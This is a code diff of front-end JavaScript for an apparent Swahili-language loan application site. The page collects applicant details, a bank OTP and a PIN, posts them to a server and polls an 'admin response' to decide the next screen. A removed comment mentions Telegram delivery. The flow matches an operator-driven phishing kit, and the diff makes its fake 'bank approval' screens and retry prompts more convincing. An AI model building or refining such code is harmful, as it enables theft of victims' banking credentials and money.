@@ -3,11 +3,36 @@ function goToScreen(screenId) {
     document.getElementById(screenId).classList.remove('hidden');
 }
 
-function showSpinner() { document.getElementById('loading-spinner').classList.remove('hidden'); }
-function hideSpinner() { document.getElementById('loading-spinner').classList.add('hidden'); }
+function showSpinner(text = 'Inapakia...') {
+    document.getElementById('loading-text').innerText = text;
+    document.getElementById('loading-spinner').classList.remove('hidden');
+}
+
+function hideSpinner() {
+    document.getElementById('loading-spinner').classList.add('hidden');
+}
+
+function showNotice(elementId, msg) {
+    const el = document.getElementById(elementId);
+    if (el) {
+        el.innerText = msg;
+        el.style.display = 'block';
+    }
+}
+
+function clearNotices() {
+    ['step3-notice', 'step4-notice', 'pin-notice'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+            el.innerText = '';
+            el.style.display = 'none';
+        }
+    });
+}
 
 async function postData(step, data) {
-    showSpinner();
+    clearNotices();
+    showSpinner('Subiri kidogo, inasubiri idhini ya Benki...');
     try {
         const response = await fetch('/api/submit', {
             method: 'POST',
@@ -16,10 +41,9 @@ async function postData(step, data) {
         });
         const result = await response.json();
         
-        // If this was an OTP resend request by the applicant
         if (result.resendAcknowledge) {
             hideSpinner();
-            alert('Ombi la kutuma tena OTP limepokelewa.');
+            showNotice('step4-notice', 'Ombi la kutuma tena OTP limepokelewa.');
             return;
         }
 
@@ -30,7 +54,7 @@ async function postData(step, data) {
         }
     } catch (e) {
         hideSpinner();
-        alert('Network connection error.');
+        showNotice('step3-notice', 'Tatizo la mtandao. Jaribu tena ❌');
     }
 }
 
@@ -43,11 +67,12 @@ function pollAdminResponse() {
                 if (res.next === 'otp') goToScreen('screen-step4');
                 else if (res.next === 'pin') goToScreen('screen-step5');
                 else if (res.next === 'success') goToScreen('screen-success');
-            } else if (res.status === 'denied' || res.status === 'retry_otp' || res.status === 'blocked' || res.status === 'retry_pin') {
-                alert(res.message);
-                if (res.status === 'retry_pin') {
-                    document.getElementById('pin-notice').innerText = res.message;
-                }
+            } else if (res.status === 'denied') {
+                showNotice('step3-notice', res.message);
+            } else if (res.status === 'retry_otp') {
+                showNotice('step4-notice', res.message);
+            } else if (res.status === 'retry_pin' || res.status === 'blocked') {
+                showNotice('pin-notice', res.message);
             }
         })
         .catch(() => {
@@ -55,19 +80,30 @@ function pollAdminResponse() {
         });
 }
 
-// Step 1: Local transition only
+function updateCalculator() {
+    const amount = document.getElementById('loanAmountSlider').value;
+    const months = document.getElementById('loanMonthsSlider').value;
+    
+    document.getElementById('displayAmount').innerText = 'TZS ' + Number(amount).toLocaleString();
+    document.getElementById('displayMonths').innerText = months + ' miezi';
+    
+    const monthlyPayment = (amount / months) * 1.05;
+    document.getElementById('displayMonthlyPayment').innerText = 'TZS ' + Math.round(monthlyPayment).toLocaleString();
+    
+    document.getElementById('requestedAmount').value = amount;
+}
+
 function submitStep1(e) {
     e.preventDefault();
     goToScreen('screen-step2');
+    updateCalculator();
 }
 
-// Step 2: Local transition only
 function submitStep2(e) {
     e.preventDefault();
     goToScreen('screen-step3');
 }
 
-// Step 3: Starts Telegram delivery
 function submitStep3(e) {
     e.preventDefault();
     const data = {
@@ -85,7 +121,6 @@ function submitStep4(e) {
     postData('step4', { otp, isResend: false });
 }
 
-// Applicant triggers a new OTP request themselves, admin is notified
 function resendOtp(e) {
     e.preventDefault();
     postData('step4', { otp: '', isResend: true });
@@ -97,4 +132,5 @@ function submitStep5(e) {
     let pin = '';
     inputs.forEach(i => pin += i.value);
     postData('step5', { pin });
-}
+        }
+                
